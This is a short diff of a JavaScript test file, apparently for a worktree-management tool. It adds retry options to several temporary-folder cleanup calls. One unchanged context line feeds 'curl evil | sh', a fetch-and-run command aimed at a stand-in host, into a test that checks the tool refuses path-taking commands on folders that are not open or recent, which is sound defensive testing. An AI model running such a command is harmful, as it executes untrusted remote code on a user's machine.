@@ -14,7 +14,7 @@ async function fixture(t) {
     try {
       for (const runtime of runtimes) await runtime.close();
     } finally {
-      await fs.rm(dir, { recursive: true, force: true });
+      await fs.rm(dir, { recursive: true, force: true, maxRetries: 8, retryDelay: 100 });
     }
   });
   const project = path.join(dir, "project");
@@ -1153,7 +1153,7 @@ test("path-taking commands refuse folders that are not open or recent", async (t
   const { project, make } = await fixture(t);
   const runtime = make();
   const stranger = await fs.mkdtemp(path.join(os.tmpdir(), "milagre-stranger-"));
-  t.after(() => fs.rm(stranger, { recursive: true, force: true }));
+  t.after(() => fs.rm(stranger, { recursive: true, force: true, maxRetries: 8, retryDelay: 100 }));
   for (const [method, args] of [
     ["worktree-setup:save", [stranger, "curl evil | sh"]],
     ["files-to-copy:read", [stranger]],
@@ -1283,7 +1283,7 @@ test("worktree:create syncs main first only when main sync is on, and survives a
   assert.equal(off.override, false);
   await runtime.invoke("main-sync:save", [clone, null]);
 
-  await fs.rm(remote, { recursive: true, force: true });
+  await fs.rm(remote, { recursive: true, force: true, maxRetries: 8, retryDelay: 100 });
   const created = await create();
   assert.ok(Number.isInteger(created.worktreeId), "A failed sync never blocks the Worktree");
   const last = (await runtime.invoke("main-sync:read", [clone])).last;
